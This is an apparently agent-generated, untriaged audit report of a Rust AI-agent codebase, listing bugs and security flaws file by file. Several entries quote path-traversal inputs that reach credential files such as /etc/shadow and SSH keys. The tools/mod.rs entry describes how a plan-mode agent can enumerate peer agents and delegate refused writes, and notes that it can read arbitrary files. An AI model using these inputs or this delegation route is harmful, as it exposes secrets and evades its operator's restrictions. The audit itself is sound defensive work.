# Audit findings

Module-by-module audit of the tree, produced by the fleet: one `audit:<file>`
task per module over ~80 lines, taken and reported by worker agents through the
board. Generated from the blackboard — regenerate with
`scripts/audit-report.py`.

**These are reports, not verdicts.** Each is one agent's reading of one file,
and it has not been triaged. Several were spot-checked by hand; the ones that
held up are fixed and referenced in the git log. Treat the rest as leads: check
the code before acting on any of them.

Findings the fleet raised against its own machinery are the most interesting
ones here, because that code was hours old when it was audited.

*91 modules audited.*

### `crates/catbus-agent/src/agent.rs`

agent.rs:100 Agent::new starts with history: Vec::new() and rebuild_history is called ONLY from swap_session (:156) — but main.rs's default is to auto-resume the newest session in the cwd (session.rs:67), and the REPL then prints a 'recent exchanges' recap from that transcript, so on every normal launch the user is shown restored context while the model receives an EMPTY history; the transcript keeps appending to the old file, so the session silently becomes two conversations in one file, and only the in-place /resume command actually loads context; agent.rs:250 the early-return arm fires when stop_reason is end_turn/stop_sequence EVEN IF tool_uses is non-empty, and it pushes that assistant turn (tool_use blocks included) into history at :257-260 with no tool_result ever produced — the next prompt then sends a history the API rejects with 'tool_use ids were found without tool_result blocks', wedging the live session until restart; truncate_at_orphan_tool_use exists to repair exactly this shape on reload but nothing guards the in-memory path that creates it; agent.rs:167-180 there is no turn-level exclusion at all, yet socket::serve spawns a task per connection and the REPL drives turns too, so two concurrent run_user_prompt calls are reachable: :171-175 the second overwrites self.cancel so cancel_current() can no longer reach the first turn (it is now uncancellable), :176/:178 whichever turn finishes first clears status to None which makes the REPL spinner loop in main.rs:527-533 break early and stop watching Ctrl-C, and both turns interleave pushes into the single shared history producing a message sequence neither turn intended; agent.rs:186 the session Arc is snapshotted under a read lock that is then dropped, while every history push re-acquires the lock (:192/:256/:294/:303) — a swap_session landing mid-turn (which /resume at main.rs:404 permits) leaves the loop appending transcript entries to the OLD session file while its messages go into the NEW session's history, and swap_session neither checks for an in-flight turn nor cancels one; agent.rs:225-226 vs :294 the assistant tool_use entry is written to the TRANSCRIPT before tools run but pushed to in-memory history only after they finish, so a cancel at :272-283 leaves the transcript holding a dangling tool_use that memory does not have — the two diverge for the rest of the process, and on the next reload truncate_at_orphan_tool_use silently discards everything from that point onward; agent.rs:310-316 the user-visible warning and the comment both say '32-round cap' while max_rounds is 200 (:206) and env-overridable — the number shown to the user is simply wrong; agent.rs:203-206 CATBUS_MAX_ROUNDS is parsed with no lower clamp, so setting it to 0 makes the for loop body never run and every prompt fails instantly with TooManyRounds; agent.rs:613 MessagesResp deserialises content into a closed Block enum (Text/ToolUse/ToolResult) with no unknown-variant fallback, so any thinking / redacted_thinking / server_tool_use block the server ever returns turns the whole turn into a 'decode:' error instead of degrading — the model choice at :35-37 is the only thing holding this up, and it is a hardcoded constant; agent.rs:353-354 model and max_tokens are hardcoded on the Anthropic path with no flag, while the OpenAI path takes --openai-model — and the comment at :36 promises a /model command that does not exist in the REPL; agent.rs:465-490 rebuild_history drops empty user turns (:474) and empty assistant turns (:483) without any role-alternation check, so a transcript with an empty turn between two assistant turns rebuilds into consecutive assistant messages, which the API also rejects; truncate_at_orphan_tool_use only validates tool pairing (and only one direction — :552 checks uses ⊆ results, never results with no matching use); agent.rs:155-161 swap_session returns Result but can never fail, so the error branch at main.rs:428 is dead; agent.rs:568-569 the ellipsis test uses cmd.len() (bytes) against a chars().take(60) truncation, so a 60-char multibyte command gets a spurious '…'

### `crates/catbus-agent/src/auth.rs`

auth.rs:112-123 the refreshed credentials are written with std::fs::write (mode 0666 & ~umask, i.e. usually 0644) and the 0600 chmod happens AFTER the rename — so ~/.claude/.credentials.json, holding a live access token AND the rotated refresh token, is world-readable for the whole window, and the temp file is world-readable while being written; the file must be CREATED 0600 (OpenOptions::mode) not fixed up afterwards, and line 122 discards the chmod result so a failure leaves it 0644 silently; auth.rs:107-118 the rotated refresh token can be LOST: do_refresh() succeeding means the server has already invalidated the old refresh token, but the new one only reaches disk at 117-118 — any failure there (ENOSPC, read-only fs, EACCES) returns a generic AuthError::Io while the on-disk file still holds a now-DEAD refresh token, permanently breaking Claude Code itself and every future catbus-agent start, with nothing in the error hinting that the user's login was just invalidated; auth.rs:117-118 the comment at 109-111 claims the write is atomic 'because a partial write would brick auth', but there is no fsync of the temp file before the rename and no fsync of the directory after — rename gives atomicity of the NAME only, not durability of the CONTENTS, so a crash can leave a present-but-empty credentials file, which is exactly the failure the comment says it is preventing; auth.rs:74+167(main.rs) one Auth is loaded per catbus-agent PROCESS and there is one process per agent tab, plus Claude Code itself owning the same file — nothing coordinates them: no file lock, and access_token() never re-reads the file before deciding to refresh, so agent A refreshes and rotates, agent B still holds the superseded refresh token in memory, B's next refresh 401s, and B has NO recovery path (it cannot reload). With many tabs this is the normal case, not an edge case; auth.rs:88-91 the reqwest client is built with no .timeout(), and the tokio Mutex on blob is held ACROSS the whole network refresh (99-124) — a hung token endpoint blocks every other access_token() caller in the process indefinitely; auth.rs:91+116 two .expect() panics in what is otherwise a Result-returning API (reqwest client build can fail on TLS backend init; serialisation is infallible today but the expect is load-bearing) — a library-level panic instead of an AuthError variant; auth.rs:100-103+164-166 now_ms falls back to 0 when the clock predates UNIX_EPOCH, so expires_at > 60000 holds and a long-expired access token is returned forever (confusing 401s downstream), while the same fallback at 164 writes an expires_at near 1970 so every later call re-refreshes and re-rotates; auth.rs:170 now_ms + body.expires_in * 1000 is unchecked on server-controlled input — a bogus expires_in overflows (panic in debug, wrap in release) into a nonsense deadline; saturating arithmetic is called for; auth.rs:74-84 load() never checks the credential file's own permissions, so a 0644 credentials file is used without a word

### `crates/catbus-agent/src/main.rs`

main.rs:178 --print-socket is handled AFTER auth::load() (167) and session::open() (169), so the API server's 'cheap path lookup' fails on machines without Claude OAuth and creates an empty {uuid}.jsonl as a side effect (session.rs:70 create(true)); with --name it also renames before returning (172); main.rs:176 vs 414 socket path is derived once from the initial session, /resume swaps the session but the socket keeps the OLD session-id filename, so clients that build the path from the new id can never reach it; main.rs:200 socket_task.abort() skips the remove_file cleanup at socket.rs:76 (there is no Drop impl, the comment at 198 is wrong) so Ctrl-D leaves a stale socket and clients get ECONNREFUSED until the next start; main.rs:549 on cancel-timeout tokio::time::timeout(_, work) DROPS the JoinHandle, which detaches rather than aborts, so a stuck tool keeps running and keeps appending to the transcript after the REPL moved on; main.rs:504-544 the Ctrl-C watcher lives only inside the spinner loop and the loop breaks as soon as agent.status is None, so if the spawned turn has not set a status within the first 120ms the REPL blocks on work.await with NO SIGINT handler and Ctrl-C kills the process instead of cancelling the turn; also tokio::signal::ctrl_c() is re-created every iteration so a signal landing outside the select window is dropped; main.rs:559 the token sidecar is saved only on the Ok path, so usage from an errored or interrupted turn is lost even though the tokens were billed; main.rs:604 set_tab_status spawns tab-atelier and drops the Child without waiting, leaking a zombie per status update (2+ per prompt) for the life of the REPL; main.rs:410 /resume <id> never validates the id exists and session.rs:70 creates the file, so a typo silently starts a fresh empty session under the typo instead of erroring; main.rs:352 /deb runs cargo deb --no-build in the arbitrary session cwd with no -p tab-atelier, so it packages stale target/ artifacts and can select the wrong workspace package; main.rs:313 line.trim().trim_matches('`') strips backticks from EVERY prompt, mutating code-snippet prompts before they reach the model; main.rs:527/292/298 .expect() on the status mutex and editor slot panics the REPL on poisoning, against the repo no-unwrap rule; main.rs:128 infomaniak_model has a default_value and no requires, so --infomaniak-model alone is accepted and silently ignored; main.rs:252 history falls back to the predictable shared /tmp/catbus-agent/history.txt holding full prompt text when XDG_STATE_HOME and HOME are both unset

### `crates/catbus-agent/src/openai.rs`

openai.rs:210 only choices[0] is read and an empty choices[] yields an empty turn with stop_reason:None — agent.rs:250 then ends the turn silently, so a provider returning 200 with an error-shaped body (common for proxies) shows the user nothing; openai.rs:222 malformed tool arguments decode to {} instead of an error, so a tool whose params are all optional RUNS with defaults rather than the model being told its JSON was invalid; openai.rs:71 max_tokens 8192 hardcoded with no knob — smaller models 400 and larger ones are silently capped; openai.rs:139 assistant messages always carry content:"" when only tool_calls are present, which Mistral and some vLLM builds reject (the spec wants null); openai.rs:73 tools[] is always sent even when empty, which some providers reject; openai.rs:136 an assistant turn with neither text nor tool_calls is dropped, so tool messages after it can reference a tool_call_id no preceding assistant declared -> 400 from strict providers; openai.rs:105 the doc says tool_results must directly follow their assistant turn but nothing verifies the pairing

### `crates/catbus-agent/src/session.rs`

session.rs:62-70 resume_id is interpolated into a filename with zero validation — no uuid parse, no rejection of separators — and main.rs:410 feeds it straight from the REPL /resume argument, so /resume ../../../../tmp/x or an absolute /resume /etc/whatever escapes the project dir entirely (Path::join with an absolute id discards the prefix) and OpenOptions::create+append then CREATES and appends JSONL to it; transcript_path, default_socket_path, save_tokens and rename all inherit the same unchecked id, so the .name/.tokens.json/.sock sidecars land there too; session.rs:67+95-115 with no --resume and new_session=false, open resumes the newest .jsonl in ~/.claude/projects/escaped-cwd — but the module doc itself says that directory is SHARED with Claude Code, so in any cwd where the human has used claude, catbus silently opens the users real Claude transcript in append mode and writes its own entries into it, chaining parentUuid onto Claude last entry; nothing distinguishes a catbus-authored file from a claude-authored one; session.rs:277-288+419-428 a crash mid-append leaves a partial final line with no trailing newline; last_entry_uuid tolerates it by skipping the unparseable tail, but the next append writeln! concatenates onto that partial line and produces one permanently corrupt merged entry — the recovery path hides the damage rather than repairing it; session.rs:379-397 save_tokens and rename use fs::write, i.e. truncate-then-write with no tmp+rename, while tab-atelier POLLS tokens.json from the same dir — a poller that reads during the window gets an empty or half-written file, and a crash there leaves the sidecar permanently truncated; session.rs:186-191 last_exchanges bakes raw ANSI escapes into Exchange.assistant_text, so this data-shaped API is only correct for a terminal — any JSON/API consumer of the preview gets literal escape bytes; session.rs:142-143+215-227 the ring keeps only the last 2n turns, so when the tail is dense with tool-only assistant turns (which are dropped at :193) the pairing can return far fewer than n exchanges although more exist earlier in the file — the preview silently thins out on tool-heavy sessions; session.rs:107-114 latest_session_id keys on file_stem, so a file like a.b.jsonl yields the id a.b and an empty --resume gives a hidden .jsonl whose Path::extension is None, making that session invisible to every later resume/list; session.rs:422-434 every lock uses .expect on poison — one panic anywhere holding the transcript, name or last-uuid mutex turns every later append into a panic instead of a SessionError, which the error type already models; session.rs:96-114 vs 355-372 latest_session_id and list_sessions duplicate the same read_dir/skip-empty/mtime scan with slightly different outputs, so a rule change (say, ignoring foreign transcripts) has to be made twice

### `crates/catbus-agent/src/socket.rs`

socket.rs:37 the socket file is deleted unconditionally before bind, with no staleness check (no connect probe, no lock) — the comment says "stale socket from a crashed previous run", but session.rs defaults to resuming the newest transcript in a cwd, so a second catbus-agent in the same directory is ordinary: it silently unlinks the RUNNING instances socket and binds its own, leaving the first agent alive but permanently unreachable while every client is redirected to the new one; socket.rs:77 makes it symmetric — the shutting-down instance removes whatever socket is at that path, including one a newer process has since bound; socket.rs:41-46 the 0600 chmod happens AFTER UnixListener::bind, so the socket exists for a window with mode 0777 masked only by umask; on any account with a permissive umask another local user can connect in that window and drive the agent (arbitrary tool execution in the users cwd, spending the users API credit), and the set_permissions result is discarded with let _ = so a failed chmod leaves it that way silently and serving continues; the containing directory is created with plain create_dir_all (:38-40, mode 0755) so directory permissions do not cover the gap either; socket.rs:81-126 there is NO authentication of any kind on the protocol — the file mode is the entire access control, and every accepted connection may issue prompts and toggle plan mode; socket.rs:87 BufReader::lines() has no line-length cap, so one client sending a large payload with no newline grows the buffer without bound and OOMs the agent; socket.rs:55-64 accepts spawn tasks with no concurrency limit and, worse, Agent has no turn-level mutual exclusion (agent.rs:68-87: run_user_prompt takes &self, guarded only by per-field locks) — two concurrent prompts interleave their transcript appends and parentUuid chains, both reset self.cancel so the earlier turn becomes uncancellable (defeating the stated intent of the comment at agent.rs:168-175), and the first to finish clears the shared status slot while the second is still running; socket.rs:70-75 shutdown breaks the accept loop and returns immediately, with no drain of in-flight handle tasks — a client mid-prompt gets a bare EOF rather than an error line, and the answer plus its API spend is lost; socket.rs:91-103 a malformed line is answered and the loop CONTINUES with no error budget, so a client can hold a connection open indefinitely feeding garbage; socket.rs:5-18 vs 154-160 the documented wire protocol advertises a chunk response that clients "should already handle", but the Response enum has no Chunk variant — the doc describes a protocol the code cannot emit; socket.rs:113-122 SetPlanMode is acknowledged with Done{text}, the same frame used for a model answer, so a client cannot distinguish an assistant reply from a mode acknowledgement; socket.rs:129+139-140 expect() is used for the Response serialization and for both signal handler installations, so a failure to install SIGINT/SIGTERM handling panics the process at startup instead of degrading to no clean shutdown

### `crates/catbus-agent/src/tools/delegate.rs`

delegate.rs:84 the reply loop hard-fails on ANY unparseable line (`malformed frame`), while the handshake loop at :57 silently ignores the same thing — so an added frame kind (`{\"kind\":\"tool_use\"}`, a heartbeat) aborts an in-flight delegation that the handshake would have tolerated; the enum has no #[serde(other)] catch-all, so there is zero forward compatibility between agent versions on the reply path only; delegate.rs:51+78 lines.next_line() grows its String without any cap — a runaway or hostile target agent that streams one unterminated multi-GB line ooms the caller, and the only backstop is the wall-clock timeout, which does not bound memory; delegate.rs:84 that error also interpolates the entire offending line into the message (`malformed frame `{line}``), so an arbitrarily large / secret-bearing frame from the target lands verbatim in the caller's tool result and logs; delegate.rs:101-103 the doc claims target accepts a 'session-id, socket-path, or relative path' but a relative path can never resolve: :111 requires is_absolute(), and :114's `!target.contains('/')` guard sends anything with a slash straight to the error at :127 — relative paths are documented and unreachable; delegate.rs:34-38 timeout_secs is only upper-capped: `timeout_secs: 0` yields Duration::ZERO and the call dies instantly with 'timed out after 0s', and a float/negative value is silently rejected by as_u64 and falls back to the 5-min default rather than erroring, so a caller mistyping the arg gets no signal; delegate.rs:111-113 an absolute target is accepted on `exists()` alone with no file-type check, so pointing at a regular file or directory produces a raw ECONNREFUSED/ENOTSOCK connect error instead of 'not a socket' (and it is TOCTOU against the connect at :41); delegate.rs:120-125 the session-id scan returns the FIRST `<id>.sock` found while read_dir order is arbitrary — the same session id present under two project dirs resolves non-deterministically, with no ambiguity error; delegate.rs:50-66 the protocol reads the greeting BEFORE writing the prompt, so if a target ever emits `started` lazily (after the first request) instead of on accept, both sides block and the call burns the full timeout with no version/capability negotiation to detect it; delegate.rs:136-139 Frame::Chunk deserializes `text: String` and immediately drops it — every streamed chunk from the target costs a full allocation for data that is discarded

### `crates/catbus-agent/src/tools/mod.rs`

tools/mod.rs:44-49 PLAN-MODE BYPASS: Delegate is exempted from the plan-mode gate on the reasoning that 'the target enforces its own plan-mode', but plan-mode is per-agent state (agent.rs:75 AtomicBool, read at agent.rs:269), so a peer that is not itself in plan mode executes Write/Edit/Bash on the caller's behalf. The comment even concedes Delegate is 'reads-and-writes-by-proxy'. ListAgents is likewise ungated and its own spec (:99-102) advertises that it returns every agent's SOCKET PATH, so the discovery half of the escape is handed to the model for free — a plan-mode agent enumerates peers and delegates the side effects it was just refused; tools/mod.rs:134-137 resolve() is documented as the centralised path rule ('so every tool agrees on the rule') but performs NO confinement: an absolute path is returned verbatim and a relative one is joined without canonicalisation or a prefix check, so ../../../../etc/shadow and ~/.ssh/id_ed25519 resolve fine for Read/Write/Edit. Contrast the main crate's resolve_sandbox_path (src/api.rs:1069), which rejects '..', absolute paths and NUL then canonicalises and prefix-checks. The framing invites callers to believe resolve() is the chokepoint when it is only a join; tools/mod.rs:22 the claim that Read is unrestricted because 'pure observation is always safe' conflates 'no side effects' with 'safe' — combined with the unconfined resolve() above, an agent in plan mode can read any file the process can open, so plan-mode stops writes but not exfiltration; tools/mod.rs:136 resolve() does not expand '~', so a model emitting the very common '~/notes.md' silently creates a directory literally named '~' inside the cwd instead of writing to the home directory — wrong-place write with no error; tools/mod.rs:59-129 tool_specs() is a second, independent list of the same six tools as dispatch() at :24-51 with no shared source of truth and no test asserting the two name sets match, so a rename in one silently yields 'unknown tool: X' at runtime; the specs are also identical regardless of plan_mode, so the model is handed Write/Edit/Bash schemas it cannot use and only discovers the refusal by spending a tool-loop turn on each, and the refusal strings (:28/:34/:40) never state that plan-mode is persistent, inviting a retry loop; tools/mod.rs:111+124 the timeout caps (1800 for Delegate, 3600 for Bash) are advertised only inside a description STRING, not as a JSON-schema 'maximum', so nothing validates them on the way in; the implementations do clamp (bash.rs:27, delegate.rs:38 both use .min(MAX_TIMEOUT)) but silently — a model asking for a longer timeout gets a shorter one with no signal, which reads as a hung tool rather than a capped one; tools/mod.rs:5 the module doc says 'The four primitives the agent loop exposes' while six tools are dispatched — ListAgents and Delegate were added without revisiting the header, which is the same omission that left the plan-mode reasoning at :44-49 unexamined; tools/mod.rs:63-127 no input_schema sets additionalProperties:false, so unrecognised keys pass validation and are silently ignored by the tools

### `crates/catbus-agent/tests/openai_mock.rs`

openai_mock.rs:66-79 every failure inside the mock-server thread is an unwrap (accept, read, write_all, tx.send) and a panic in a spawned thread does NOT fail the test — it silently kills the server, after which the test blocks until recv_timeout(5s) at :237 or the 60s socket read timeout at :197 and then fails with a message pointing at the agent rather than at the server that actually broke; every mock failure is misattributed by construction; openai_mock.rs:283-288 the comment says plan-mode is flipped first 'so the failing request is also built with the plan-mode system prompt branch', but the captured request is bound as _rx at :274 and never inspected — nothing asserts the request body contains the plan-mode text, so the branch this test claims to cover is exercised without being verified and a regression in dynamic_system_text would not fail it; openai_mock.rs:324-350 the test named anthropic_is_the_default_backend asserts only that --print-socket printed a path and exited 0; it proves auth::load succeeded (the process would exit non-zero without credentials) but nothing distinguishes which Provider variant was constructed, so the name overclaims what is checked; openai_mock.rs:299-322 the comment at :303-304 says --print-socket 'exits before any HTTP, so the backend config is constructed but never contacted' — true for HTTP but not for the filesystem: main.rs runs session::open first, which creates an empty jsonl transcript, and the test only fails to notice because HOME is a tempdir, so the sole coverage of that path documents narrower behaviour than what actually happens; openai_mock.rs:95-110 read_http_request only understands Content-Length and falls back to unwrap_or(0) — a chunked or unterminated body silently yields a truncated buffer and then panics inside body_of's serde unwrap at :216 with a JSON error instead of a useful message; it also has no write timeout at :69 (only a read timeout), so an agent that never reads the response hangs the server thread indefinitely; openai_mock.rs:214-217 body_of takes nth(1) of a split on the header terminator, so any body containing that byte sequence would be truncated rather than parsed — safe only because reqwest escapes CRLF inside the JSON payload; openai_mock.rs:62-79 the server serves exactly responses.len() connections and then drops the listener, so one unexpected extra round (a retry, a probe, a loop bug) fails as ECONNREFUSED far from the real assertion, and no test asserts how many requests were actually made — api_error_is_reported_over_the_socket queues one response and never checks that only one was consumed; openai_mock.rs:177 the child is spawned with inherited stdio, so the agent's --no-tui info-level logging (main.rs:139) bypasses libtest capture entirely and pollutes cargo test output on every run, including passing ones, with no way to attribute a line to a test; openai_mock.rs:122 KillOnDrop shells out to the kill binary instead of signalling directly and discards the result, so on a system without kill on PATH every test pays the full 5s try_wait loop before SIGKILL; no test asserts the agent exits cleanly or that the socket file is removed on shutdown, which is the one thing the SIGTERM-first comment at :114-117 exists to justify

### `src/agent_probe.rs`

agent_probe.rs:213 sample_tree reads only /proc/<pid>/task/<pid>/children — the MAIN thread's children; a process forked from any other thread is listed under /proc/<pid>/task/<tid>/children and is therefore invisible to the walk. claude is bun-compiled and spawns via libuv worker threads, so the very subtree this module exists to measure can be silently undercounted in cpu_ticks/rss/procs/ctxsw; needs a pass over task/*/children; agent_probe.rs:113-134 dt is derived from SystemTime (wall clock), not a monotonic Instant — an NTP step or suspend/resume corrupts every rate on the line: a forward step dilutes cpu_pct toward 0 with no signal, a backward step makes duration_since() Err so the sample is dropped; ts needs wall-clock but dt needs Instant, so both must be carried; agent_probe.rs:123-133 prev is keyed by TAB NAME alone and never validated against pid — if the agent restarts between two ticks under the same tab the new process's counters start near zero, rate() clamps every delta to 0, and the first post-restart line reports a confident 0% CPU / 0 ctxsw instead of being skipped (the comment at 118-121 only covers 'gone at sample time'); a tab RENAME also orphans the map entry forever, since forget() is later called with the new name; agent_probe.rs:513-521 state_base() duplicates platform::linux::state_base_dir() ONLY, but platform::windows::state_base_dir() returns local_app_data() — flag_enabled reads read_flags(&state_base()) while set_persisted_flag writes under the CALLER's base, so on Windows 'tab-atelier flags probe on' writes %LOCALAPPDATA%/tab-atelier/flags.json and the reader looks in $HOME/.local/state/... (or /tmp/.local/state when HOME is unset): the persisted toggle silently never takes effect and probe logs land somewhere nothing else lists; the doc at 509-511 claims it mirrors platform::state_base_dir(), it mirrors one of the two; agent_probe.rs:484-486 read_latest parses the ENTIRE log (up to the 4 MiB rotate cap, ~20k lines) into a Vec<ProbeLine> and then pops the last element — a full parse plus 20k allocations to answer 'what is this tab doing right now'; agent_probe.rs:471 read_all never reads the rotated .jsonl.1 written at 461, so the documented 'whole probe timeline' silently loses up to half the history immediately after a rotation; agent_probe.rs:208 rss_kb is summed across the subtree, double-counting shared pages (COW heap after fork, shared libc/text), so ProbeLine.rss_mb systematically OVERSTATES the footprint — which is the exact number the module exists to diagnose; smaps_rollup Pss is the honest measure; agent_probe.rs:548-557 which() tests is_file() but not the executable bit, so a non-executable 'strace' on PATH is accepted and the failure resurfaces as an opaque shell error at agent launch; agent_probe.rs:530-543 any non-bool value of TAB_ATELIER_AGENT_TRACE implies ENABLED, so a typo (TAB_ATELIER_AGENT_TRACE=yeah) silently switches tracing on and then resolves no tracer at all; agent_probe.rs:191 the walk has no visited set and no depth bound, so a pid seen twice (reuse mid-walk, re-parenting) is summed twice; agent_probe.rs:452-465 append_line does create_dir_all + metadata + open + write + close per tab per 2 s tick with no cached fd; agent_probe.rs:35-38 the CLK_TCK=100 rationale ('reading it means an unsafe sysconf call') is not real — AT_CLKTCK is readable from /proc/self/auxv with no unsafe; the value happens to be right on the supported targets, so this is about the comment, not the number

### `src/agent_reaper.rs`

agent_reaper.rs:167-177+126-127 kill_group ignores the exit status of kill(1) while reap_orphans unconditionally does killed += 1 and freed_mb += rss, so the reported "reaped N, freed X MB" is never verified; worse, the command is the bare name kill resolved through PATH (net_nft::nft_bin resolves absolute paths precisely because a launcher-provided PATH may be minimal) — /bin/kill missing means the reaper silently kills nothing and still reports a full successful sweep, and a.session is documented as being for logging but is never logged anywhere in the module; agent_reaper.rs:76-97 the record is rewritten with fs::write (truncate-in-place, no tmp+rename) on EVERY tick, so a crash inside that window leaves a truncated or empty file — and a crash is exactly the case the whole feature exists for: reap_orphans then fails to parse at :115, returns an empty report, and the ghosts survive; agent_reaper.rs:112-117 both early returns skip the remove_file at :131, so an unparseable or unreadable record is retried at every single startup forever instead of being cleared; agent_reaper.rs:24-27+122 the zero-collateral argument holds only WITHIN ONE BOOT: start_time is ticks since boot, the record file is persistent, and nothing stores a boot id or /proc/stat btime — after a reboot a stale record can match an unrelated process that happens to get the same pid at the same tick offset, and that process is then SIGKILLed along with its whole group; agent_reaper.rs:60-62+76 the record is a single unscoped file in the state dir with no owning-instance marker, so two GUIs sharing a state dir clobber each other every tick, and the second one starting up runs reap_orphans against the FIRST ones still-live agents whose pid+start_time match exactly — it SIGKILLs the running instance fleet, which the module doc claims is impossible; agent_reaper.rs:41-43+167 the doc asserts pid == pgid because agent tabs exec claude, but that is never verified before kill -- -PID; the launch path can interpose wrappers (setpriv, bwrap, the strace probe wrap), and nothing here re-checks that the recorded pid is still a group leader; agent_reaper.rs:156-161 proc_rss_mb hardcodes a 4 KiB page (pages * 4 / 1024) — wrong on any arm64 kernel with 16K/64K pages, where the freed figure is off by 4-16x; it also sums per-process RSS, so shared pages are counted once per process and the total is optimistic by construction; agent_reaper.rs:142-161 the module is compiled on every platform but reads /proc unconditionally, so on non-Linux proc_start_time is always None: record_live_agents writes an empty list and reap_orphans reaps nothing, silently, with no cfg gate and no log; agent_reaper.rs:67-69+77+108 reap_enabled is consulted independently at record and at reap time, so toggling the flag off leaves the last record on disk indefinitely and a much later re-enable reaps against an arbitrarily old (likely post-reboot) record — the interaction with the missing boot-id guard is what makes that dangerous rather than merely stale

### `src/alloc_count.rs`

alloc_count.rs:11-15+41-47 the counting allocator is installed ONLY by the headless binary (src/bin/tab-atelier-headless.rs:29), but snapshot() is compiled into both builds and the only consumer, bench, is routed by the SHARED client dispatcher (cli/client.rs:100, documented as used by both the GUI and the daemon) — so tab-atelier bench on the GUI build prints 0 allocations for every case and "process allocations so far: 0" (bench.rs:296-322) as though the workload allocated nothing; there is no installed/not-installed signal anywhere in the API, so a zero is indistinguishable from a real measurement; alloc_count.rs:21-29+43-46 the counters are process-global and a Snapshot delta therefore includes every other threads allocations, yet bench.rs:296-300 uses exactly such a delta as "allocations for this payload" — in the daemon (or any run with background threads live) the reported per-MiB figure silently absorbs unrelated work, which is the one thing an allocation count is supposed to be immune to; alloc_count.rs:73-96 only layout.size() is accounted, not the size class the allocator actually reserved, so LIVE_BYTES systematically under-reports the real heap; the doc at :24 calls it a "current heap balance", and anything comparing it against RSS or a cgroup memory.max (which this project does track per tab) will read low by the allocator overhead plus every byte obtained outside this allocator (mmap, C libraries) — worth stating in the doc rather than leaving to the reader; alloc_count.rs:53-59 since() uses wrapping_sub for the two u64 fields but a plain i64 subtraction for live_bytes, so the one field the doc explicitly says can go transiently NEGATIVE (:25-28) is the field whose delta is not overflow-guarded — in a debug build that arithmetic panics rather than wrapping, and a panic inside the allocator-adjacent path is the worst possible failure mode for a diagnostic; alloc_count.rs:98-110 realloc bumps ALLOCATIONS even when new_size == layout.size(), so a no-op resize is counted as an allocation event, and ALLOCATED_BYTES is only credited when the block GROWS — a workload dominated by shrinking reallocs reports fewer bytes than it moved, which makes the "bytes ever allocated" counter mean something different for realloc than for alloc; alloc_count.rs:83-86 dealloc decrements LIVE_BYTES but nothing counts frees, so the pair (ALLOCATIONS, LIVE_BYTES) cannot distinguish a leak from high allocation churn — the cheapest possible addition for the diagnostic this module exists to provide; alloc_count.rs:1-113 there is not a single test in the file, although since() and the realloc delta arithmetic are pure, trivially testable, and exactly the kind of signed/unsigned accounting that is easy to get wrong — every other module in this crate carries a tests module

### `src/api.rs`

api.rs:139-152 + :184-191 a botched edit spliced two doc comments together: the block above sidecar_route opens with two lines describing parse_tab_key ('Parse the tab segment between /tabs/ and a suffix … Returns (idx, key_for_html) after') and then jumps mid-sentence into 'Is this request one a sidecar peer may make…', while parse_tab_key at :188 is left carrying the orphaned tail ('resolution against the snapshot: …') that starts mid-clause — the rustdoc for the security-critical sidecar gate is wrong at its first two lines; api.rs:1555-1561 the bearer token is taken from `lower`, the ASCII-LOWERCASED copy of the header line, so `auth_token` is the lowercased token while the `?token=` query form (:1599-1602, parsed from the un-lowercased raw path) is not — the same credential therefore authenticates over one transport and fails over the other for any token containing uppercase; this works today only because generate_token (:771-779) emits `{b:02x}`, and the test that supposedly pins it (:4123, is_ascii_hexdigit) ACCEPTS uppercase hex, so switching to {b:02X} or a user-configured api.token with capitals silently breaks header auth while leaving the tests green; api.rs:1571-1572 if_none_match is lowercased from the same source, so any ETag that is not all-lowercase silently never matches and conditional requests degrade to 200 forever; api.rs:1317-1330 constant_time_eq's doc claims it 'Returns false on length mismatch without leaking length differences via early exit' — the code does exactly the opposite, `if a.len() != b.len() { return false }` IS an early exit that leaks the length; the property is fine for fixed-length hex tokens but the comment asserts a guarantee the function does not provide, which is how the next reader reuses it somewhere it matters; api.rs:1646-1668 the body cap is chosen by `path.ends_with(\"/files\")` and applied BEFORE the auth gate at :1693, so an UNAUTHENTICATED request to any path ending in /files (`POST /nonsense/files`) is granted the 100 MiB UPLOAD_MAX_BYTES budget and `vec![0u8; content_length]` is allocated and read before a single token is checked — N concurrent anonymous connections pin N x 100 MiB, and the per-token upload-slot limiter the comment at :1643-1645 relies on never runs; api.rs:1735-1739 the remote-peer check omits the non-empty guard its two siblings have: the master compare at :1719 gates on `!snap.master_token.is_empty()` with a comment explaining precisely why, and the share-token compares at :1757/:1759 both gate on `!…is_empty()`, but the remote-token compare has no such guard — it is safe only because read_or_mint_token (lib.rs:1794) happens never to return empty, an invariant enforced two modules away and asserted nowhere; api.rs:1708+1783-1805 share_token_authorised is assigned in one branch and then explicitly discarded (`let _ = share_token_authorised;`), so the RW/RO verdict the gate computed is thrown away and no downstream arm can consult it — the read-only restriction survives only as the `needs_rw` path-string match at :1768, meaning any future route added under /tabs/by-id/<uuid>/ that is not in that hardcoded list silently inherits RO access; api.rs:174-181 the sidecar authorisation decision is made with `rest.contains(\"/outbox/\")` / `contains(\"/inbox/\")` — a substring test anywhere in the path rather than a parsed segment — so the auth gate and the route parser disagree about what the path means, and the safety of that gap depends entirely on traversal checks living in a different module; api.rs:1550-1554 the header loop puts no bound on a single header line: read_line grows `line` until CRLF, so one unterminated header from an unauthenticated client grows the buffer without limit, and the documented slow-loris guard is a TIME budget on the hyper side, not a length one

### `src/api/assets.rs`

6 findings: no Vary+shared ETag across gzip/identity under immutable caching; openapi_spec() re-reads disk per unauth request (no LazyLock); immutable max-age on term-symbols.woff2 which has no version/query cache key; woff2+PNGs gzipped pre-auth (woff2 grows +38B); duplicated allowlist with _ => MAIN_CSS catch-all defeating exhaustiveness; api-catalog arm bypasses respond_with_etag (no ETag/304)

### `src/api/catbus.rs`

